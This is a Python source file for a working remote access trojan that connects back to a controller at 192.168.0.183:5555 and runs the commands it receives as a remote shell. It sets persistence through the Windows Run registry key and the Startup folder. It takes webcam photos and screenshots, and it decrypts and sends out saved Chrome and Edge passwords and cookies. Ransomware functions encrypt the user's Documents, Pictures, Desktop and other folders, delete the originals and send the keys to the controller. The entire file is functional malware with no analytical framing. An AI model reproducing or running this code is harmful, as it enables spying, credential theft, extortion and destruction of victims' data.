# replace mss with pyautogui for screenshots
import socket
import json
import subprocess
import time
import os
import shutil
import sys
from sys import platform
from cryptography.fernet import Fernet
import pickle
import io
import cv2
import getpass
from PIL import Image
from mss import mss
import ssl
import platform as pform
import sys
from datetime import timezone, datetime, timedelta
import base64
from win32.win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import sqlite3
from base64 import b64decode
from Cryptodome.Cipher.AES import new, MODE_GCM
from os.path import expandvars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s = ssl.wrap_socket(s)

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def upload_file(file_name):
    with open(file_name, 'rb') as f, io.BytesIO() as bs:
        chunk = f.read(1024)
        while chunk:
            bs.write(chunk)
            chunk = f.read(1024)
        s.sendall(bs.getvalue())

def download_file(file_name):
    try:
        with open(file_name, 'wb') as f:
            s.settimeout(5)
            while True:
                try:
                    chunk = s.recv(1024)
                    if chunk:
                        f.write(chunk)
                    else:
                        break
                except socket.timeout as e:
                    break
        s.settimeout(None)
    except Exception as e:
        pass

def upload_byte_arr(byte_arr):
    byte_arr.seek(0)
    chunk = byte_arr.read(10485760)
    while chunk:
        try:
            s.sendall(chunk)
        except:
            pass
        chunk = byte_arr.read(10485760)

def capture_webcam_picture(name):
    webcam = cv2.VideoCapture(0)
    webcam.set(cv2.CAP_PROP_EXPOSURE, 40)

    if not webcam.isOpened():
        print("No webcam available")
        return
    
    ret, frame = webcam.read()

    if not ret:
        print("Failed to read frame from webcam")
        return

    webcam.release()
    
    is_success, im_buf_arr = cv2.imencode(".jpg", frame)
    byte_im = im_buf_arr.tobytes()

    byte_im_io = io.BytesIO(byte_im)
    upload_byte_arr(byte_im_io)

def screenshot():
    sct = mss()
    if platform in ["win32", "darwin", "linux"]:
        screenshot = sct.grab(sct.monitors[0])
        img_byte_arr = io.BytesIO()
        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
        img.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        return img_byte_arr

def persist_reg(reg_name, file_name):
    file_location = os.environ['appdata'] + '\\' + file_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
                shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[-] Error Creating Persistence With The Target Machine')

def persist_startup(file_name):
    startup_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup') + '\\'

    file_location = startup_folder + file_name
    
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(file_name, file_location)
            reliable_send('[+] Copied file to the Startup folder: ' + file_name)
        else:
            reliable_send('[+] File already exists in the Startup folder')
    except Exception as e:
        reliable_send('[-] Error copying file to the Startup folder: ' + str(e))

def is_admin():
    global admin
    if platform == 'win32':
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
        except:
            admin = '[!!] User Privileges!'
        else:
            admin = '[+] Administrator Privileges!'

def getKey():
    key = Fernet.generate_key()
    return key

def send_key(file_name, key):
    new_file_name = f'{file_name}.key'
    s.sendall(pickle.dumps((new_file_name, key)))

def encrypt_file(filename):
    key = getKey()
    f = Fernet(key)

    with open(filename, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    encrypted_filename = filename + '.fhook'

    with open(encrypted_filename, 'wb') as file:
        file.write(encrypted_data)
    send_key(filename, key)
    os.remove(filename)

def encrypt_file_in_dir(filename, key):
    f = Fernet(key)

    with open(filename, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    encrypted_filename = filename + '.fhook'

    with open(encrypted_filename, 'wb') as file:
        file.write(encrypted_data)
    os.remove(filename)

def encrypt_user_dir():
    key = getKey()
    path = os.path.expanduser('~')
    dirs_to_encrypt = ['Documents', 'Pictures', 'Videos', 'OneDrive', 'Downloads', 'Desktop']
    
    for directory in dirs_to_encrypt:
        full_dir_path = os.path.join(path, directory)
        if os.path.exists(full_dir_path):
            for foldername, subfolders, filenames in os.walk(full_dir_path):
                for filename in filenames:
                    full_path = os.path.join(foldername, filename)
                    try:
                        encrypt_file_in_dir(full_path, key)
                    except PermissionError:
                        print(f"Permission denied: {full_path}. Skipping file.")
                        continue
                    except Exception as e:
                        print(f"Encryption error: {e}, file: {full_path}")
        else:
            print(f"Directory {directory} not found. Skipping.")
    username = getpass.getuser()
    username = username.replace(" ", "")
    send_key(username, key)

def info():
    hostname = pform.node()
    username = getpass.getuser()
    os_name = pform.system()
    os_version = pform.version()
    os_architecture = pform.machine()
    return f'Hostname: {hostname}\nUsername: {username}\nOS: {os_name}\nVersion/Build: {os_version}\nArchitecture: {os_architecture}'

def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""

def get_local_state(browser):
    if browser == 'chrome':
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    elif browser == 'edge':
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        return local_state
    
def get_login_data(browser):
    if browser == 'chrome':
        return os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    elif browser == 'edge':
        return os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "default", "Login Data")

def get_encryption_key(browser):
    local_state = get_local_state(browser)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_chrome_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def get_passwords(browser):
    key = get_encryption_key(browser)
    db_path = get_login_data(browser)
    filename = "Data.db"

    shutil.copyfile(db_path, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    data = ''
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_chrome_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
            
        if username or password:
            data += (f"Origin URL: {origin_url}\n")
            data += (f"Action URL: {action_url}\n")
            data += (f"Username: {username}\n")
            data += (f"Password: {password}\n")
        else:
            continue
            
        if date_created != 86400000000 and date_created:
            data += (f"Creation date: {str(get_chrome_datetime(date_created))}\n")
        if date_last_used != 86400000000 and date_last_used:
            data += (f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
        data += ("="*50 + "\n")
    
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

    byte_array = bytes(data, 'utf-8')
    return byte_array

def get_cookies(browser):
    if browser == 'chrome':
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    elif browser == 'edge':
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)

    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")

    key = get_encryption_key(browser)
    data = '' 
    for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
        if not value:
            decrypted_value = decrypt_chrome_password(encrypted_value, key)
        else:
            decrypted_value = value

        data += f"""
        Host: {host_key}
        Cookie name: {name}
        Cookie value (decrypted): {decrypted_value}
        Creation datetime (UTC): {get_chrome_datetime(creation_utc)}
        Last access datetime (UTC): {get_chrome_datetime(last_access_utc)}
        Expires datetime (UTC): {get_chrome_datetime(expires_utc)}
        ===============================================================
        """
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

    byte_array = bytes(data, 'utf-8')
    return byte_array

def get_cookies_and_upload(browser):
    byte_array = get_cookies(browser)
    byte_arr_io = io.BytesIO(byte_array)
    upload_byte_arr(byte_arr_io)

def get_passwords_and_upload(browser):
    byte_array = get_passwords(browser)
    byte_arr_io = io.BytesIO(byte_array)
    upload_byte_arr(byte_arr_io)

def shell():
    while True:
        command = reliable_recv()
        action = command.split(' ')[0] if ' ' in command else command
        args = command[len(action)+1:] if ' ' in command else ''
        args = args.replace("'", "''")
        args = args.replace('"', '\"')
        args = args.replace("\\", "\\\\")

        match action:
            case 'quit':
                return
            case 'help':
                pass
            case 'cd':
                try:
                    args = args.strip('\"')
                    os.chdir(args)
                    reliable_send(os.getcwd())
                except Exception as e:
                    reliable_send('[-] Error changing directory: ' + str(e))
            case 'encrypt':
                encrypt_file(args)
            case 'encrypt_user_dir':
                encrypt_user_dir()
            case 'webcam':
                capture_webcam_picture(args)
            case 'put':
                download_file(args)
            case 'get':
                upload_file(args)
            case 'screenshot':
                img_byte_arr = screenshot()
                upload_byte_arr(img_byte_arr)
            case 'reg_persist':
                reg_name, copy_name = args.split(' ')
                persist_reg(reg_name, copy_name)
            case 'startup_persist':
                persist_startup(args)
            case 'info':
                try:
                    reliable_send(info())
                except:
                    reliable_send('Cannot Perform System Info Collection!')
            case 'chrome_pass':
                try:
                    get_passwords_and_upload('chrome')
                except:
                    reliable_send('Cannot Perform Chrome Password Collection!')
            case 'edge_pass':
                try:
                    get_passwords_and_upload('edge')
                except:
                    reliable_send('Cannot Perform Edge Password Collection!')
            case 'chrome_cookies':
                try:
                    get_cookies_and_upload('chrome')
                except:
                    reliable_send('Cannot Perform Chrome Cookie Collection!')
            case 'edge_cookies':
                try:
                    get_cookies_and_upload('edge')
                except:
                    reliable_send('Cannot Perform Edge Cookie Collection!')
            case 'check':
                try:
                    is_admin()
                    reliable_send(admin + ' platform: ' + platform)
                except:
                    reliable_send('Cannot Perform Privilege Check! Platform: ' + platform)
            case 'start':
                try:
                    subprocess.Popen(args, shell=True)
                    reliable_send('[+] Started!')
                except:
                    reliable_send('[-] Failed to start!')
            case _:
                execute = subprocess.Popen(['powershell.exe', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                reliable_send(result)

def connection():
    while True:
        time.sleep(5)
        try:
            s.connect(('192.168.0.183', 5555))
            shell()
            s.close()
            break
        except:
            pass

connection()
